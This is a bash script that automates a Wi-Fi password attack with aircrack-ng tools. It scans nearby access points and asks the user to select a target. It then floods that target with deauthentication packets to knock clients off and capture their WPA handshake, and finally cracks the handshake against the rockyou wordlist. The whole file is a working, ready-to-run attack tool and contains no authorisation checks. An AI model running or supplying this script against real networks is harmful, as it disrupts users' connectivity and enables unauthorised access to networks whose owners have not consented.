#!/bin/bash

airmon-ng

read -p  "Please copy and paste your interface name: " interface

airmon-ng check kill

airmon_output=$(airmon-ng start "$interface" 2>&1)

echo "$airmon_output"

if echo "$airmon_output" | grep -q "monitor mode already enabled"; then

    monitoring_interface="$interface"
else

    monitoring_interface=$(echo "$airmon_output" |

        sed -n 's/.* on \[[^]]*\]\([^)]*\)).*/\1/p' |

        tail -n 1)
fi

# save output from  airodump command to a fle called "essid_names"

output_dir="/home/$SUDO_USER/wifi_test"

mkdir -p "$output_dir"

timeout -s INT -k 3s 15s airodump-ng --write "$output_dir/essid_names" --output-format csv "$monitoring_interface" >/dev/null 2>&1

awk -F',' '

    NF >= 14 &&

    $1 ~ /^[[:space:]]*([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}[[:space:]]*$/ {

        gsub(/^[[:space:]]+|[[:space:]]+$/, "", $1)

        gsub(/^[[:space:]]+|[[:space:]]+$/, "", $4)

        gsub(/^[[:space:]]+|[[:space:]]+$/, "", $14)

        if ($14 == "") {

            next
        }

        print $1, $4, $14
    }

' "$output_dir/essid_names-01.csv" |

sort -u > "$output_dir/essid_names.txt"

awk '{print NR ")", $0}' "$output_dir/essid_names.txt"

echo

read -p "Select the line that has your target on it: " choice

# Read the selected line and store BSSID and CH
read BSSID CH <<< "$(

    awk -v n="$choice" '

            NR==n {

            print $1, $2

            exit

        }

    ' "$output_dir/essid_names.txt"

)"

if [[ -z "$BSSID" ]]; then

    echo "Invalid selection."

    exit 1

fi

clear

airodump-ng -c "$CH" -w "$output_dir/wifihack" --bssid "$BSSID" "$monitoring_interface" &

capture_pid=$!

timeout 20 aireplay-ng --deauth 0 -a "$BSSID" "$monitoring_interface"

kill "$capture_pid"

wait "$capture_pid" 2>/dev/null

cap_file=$(find "$output_dir" -maxdepth 1 -type f -name 'wifihack-*.cap' -print -quit)

if [[ -z "$cap_file" ]]; then

    echo "Capture file not found."

    exit 1

fi

clear

#save the wifihack cap file as a verriable called "cap_file"

aircrack-ng "$cap_file" -w /usr/share/wordlists/rockyou.txt

systemctl start NetworkManager

airmon-ng stop "$monitoring_interface"

rm -rf -- "$output_dir"

exit 0
